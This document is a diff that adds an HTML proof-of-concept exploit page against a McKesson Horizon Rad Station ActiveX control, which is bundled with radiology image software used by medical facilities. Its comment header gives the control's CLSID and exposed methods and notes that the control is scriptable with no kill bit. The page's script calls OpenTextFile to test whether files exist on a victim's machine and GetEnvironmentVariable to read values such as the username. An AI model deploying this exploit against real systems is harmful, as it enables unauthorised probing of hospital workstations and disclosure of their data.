@@ -1,0 +1,53 @@
+<html>
+<!--
+McKesson ActiveX File/Environmental Variable Enumeration
+Vendor: McKesson
+Version: 11.0.10.38
+Tested on: Windows XP SP3 / IE
+Download: N/A
+Author: Blake
+Additional Details: This activex control is packaged with the Horizon Rad Station software used by medical facilities to view radiology images.
+
+CLSID: 0EBFF91A-001E-4FF1-ABBB-FF9D0F6E3E3B
+Path: C:\Program Files\McKesson\HRS Distributed\McKDXVLauncher.dll
+Member Name: OpenTextFile
+Member Name: GetEnvironmentVariable
+Progid: DXVLauncherLib.McKLauncher
+Safe for Scripting: True
+Safe for Initialization: True
+Kill Bit: False
+-->
+<object classid='clsid:0EBFF91A-001E-4FF1-ABBB-FF9D0F6E3E3B' id='target' ></object>
+<title>McKesson Rad Station ActiveX File/Variable Enumeration</title>
+<h1>McKesson Rad Station File Enumeration</h1>
+<p>This proof of concept will check if a file exists on the victim's machine or display the contents of an environmental variable. It uses the member OpenTextFile from DXVLauncherLib.McKLauncher and returns an object if the file exists and uses the member GetEnvironmentVariable to display the contents of the environmental variable.
+</p>
+<form>File to check for: <input type="text" name="filename" value="c:\WINDOWS\win.ini">
+<input type=button onclick="checkfile()" value="File Exists?"><br />
+Environmental Variable: <input type="text" name="variable" value="username">
+<input type=button onclick="getvariablevalue()" value="Get Value">
+</form>
+
+<script>
+function checkfile()
+{
+	var file = document.getElementById('filename').value;
+	var arg2 = 1;
+
+	try {
+		target.OpenTextFile(file,arg2); 
+		alert("File " + file + " exists");
+	}
+	catch (oException) {
+		alert("File does not exist or was not found at the location specified")
+	}
+}
+
+function getvariablevalue()
+{
+var variablevalue = document.getElementById('variable').value;
+
+result = target.GetEnvironmentVariable(variablevalue); 
+alert("Value of " + variablevalue + ": " + result );
+}
+</script>
